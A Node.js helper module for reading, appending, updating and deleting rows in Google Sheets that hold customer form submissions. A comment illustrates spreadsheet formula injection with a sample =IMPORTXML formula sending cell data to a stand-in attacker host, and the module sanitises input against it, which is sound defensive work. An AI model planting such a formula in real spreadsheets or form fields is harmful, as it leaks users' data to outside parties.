const { getAccessToken } = require('./google-auth')

const SHEETS_SCOPE = 'https://www.googleapis.com/auth/spreadsheets'

// USER_ENTERED makes Sheets parse leading =/+/-/@ as a live formula. Row data here is
// customer-submitted (job-request/lead forms), so without this a description like
// =IMPORTXML("https://evil.example/leak?x="&A1,"//a") would execute the moment the
// sheet is opened. Prefixing with an apostrophe forces literal-text, the standard
// mitigation for CSV/spreadsheet formula injection — only applied to strings so real
// numeric values (e.g. ai_estimate_low) keep their native Sheets number type.
function sanitizeSheetValue(value) {
  if (typeof value !== 'string') return value
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
}

function columnLetter(index) {
  let letter = ''
  let n = index + 1
  while (n > 0) {
    const rem = (n - 1) % 26
    letter = String.fromCharCode(65 + rem) + letter
    n = Math.floor((n - 1) / 26)
  }
  return letter
}

async function appendRow(sheetId, tab, headers, rowObject) {
  const accessToken = await getAccessToken([SHEETS_SCOPE])
  const range = encodeURIComponent(`'${tab.replace(/'/g, "''")}'!A:Z`)

  const response = await fetch(
    `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
    {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        majorDimension: 'ROWS',
        values: [headers.map(header => sanitizeSheetValue(rowObject[header] ?? ''))]
      })
    }
  )

  const payload = await response.json()

  if (!response.ok) {
    throw new Error(payload.error?.message || 'Failed to append row to Google Sheet')
  }

  return payload
}

// Reads all rows and maps them against the header row (row 1). Returns each
// data row tagged with its 1-indexed sheet row number so callers can target
// updates precisely without a separate lookup pass.
async function getRows(sheetId, tab) {
  const accessToken = await getAccessToken([SHEETS_SCOPE])
  const range = encodeURIComponent(`'${tab.replace(/'/g, "''")}'!A:Z`)

  const response = await fetch(
    `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}`,
    { headers: { Authorization: `Bearer ${accessToken}` } }
  )

  const payload = await response.json()

  if (!response.ok) {
    throw new Error(payload.error?.message || 'Failed to read Google Sheet')
  }

  const [headerRow, ...dataRows] = payload.values || []
  if (!headerRow) return { headers: [], rows: [] }

  const rows = dataRows.map((row, i) => {
    const values = {}
    headerRow.forEach((header, colIndex) => {
      values[header] = row[colIndex] ?? ''
    })
    return { rowNumber: i + 2, values }
  })

  return { headers: headerRow, rows }
}

// Updates a subset of named columns on a single existing row.
async function updateRowCells(sheetId, tab, rowNumber, headers, updates) {
  const accessToken = await getAccessToken([SHEETS_SCOPE])
  const data = Object.entries(updates)
    .map(([header, value]) => {
      const colIndex = headers.indexOf(header)
      if (colIndex === -1) return null
      const range = `'${tab.replace(/'/g, "''")}'!${columnLetter(colIndex)}${rowNumber}`
      return { range, values: [[sanitizeSheetValue(value)]] }
    })
    .filter(Boolean)

  if (!data.length) return { updatedCells: 0 }

  const response = await fetch(
    `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values:batchUpdate`,
    {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ valueInputOption: 'USER_ENTERED', data })
    }
  )

  const payload = await response.json()

  if (!response.ok) {
    throw new Error(payload.error?.message || 'Failed to update Google Sheet row')
  }

  return payload
}

// deleteDimension addresses a tab by its NUMERIC id (the gid), not the name every other
// call here uses, so the name has to be resolved first. Fetched per delete rather than
// cached: deletes are rare and a stale gid would delete rows out of the wrong tab.
async function getTabId(sheetId, tab) {
  const accessToken = await getAccessToken([SHEETS_SCOPE])
  const response = await fetch(
    `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}?fields=sheets(properties(sheetId,title))`,
    { headers: { Authorization: `Bearer ${accessToken}` } }
  )
  const payload = await response.json()
  if (!response.ok) throw new Error(payload.error?.message || 'Failed to read Google Sheet')

  const found = (payload.sheets || []).find(s => s.properties?.title === tab)
  if (!found) throw new Error(`No tab named "${tab}" in that spreadsheet`)
  return found.properties.sheetId
}

// Removes one row outright. Callers MUST resolve rowNumber from a fresh getRows keyed on
// request_id, never from a number they were holding: every row below a delete shifts up by
// one, so a stale index deletes somebody else's job.
async function deleteRow(sheetId, tab, rowNumber) {
  // Row 1 is the header. Deleting it would silently break every future read, since getRows
  // maps values by the sheet's own header row.
  if (!Number.isInteger(rowNumber) || rowNumber < 2) {
    throw new Error(`Refusing to delete row ${rowNumber}`)
  }

  const tabId = await getTabId(sheetId, tab)
  const accessToken = await getAccessToken([SHEETS_SCOPE])

  const response = await fetch(
    `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}:batchUpdate`,
    {
      method: 'POST',
      headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        requests: [{
          deleteDimension: {
            // rowNumber is 1-based and includes the header; this range is 0-based and
            // half-open, so row 2 is [1, 2).
            range: { sheetId: tabId, dimension: 'ROWS', startIndex: rowNumber - 1, endIndex: rowNumber }
          }
        }]
      })
    }
  )

  const payload = await response.json()
  if (!response.ok) throw new Error(payload.error?.message || 'Failed to delete Google Sheet row')
  return payload
}

module.exports = { appendRow, getRows, updateRowCells, deleteRow, columnLetter }
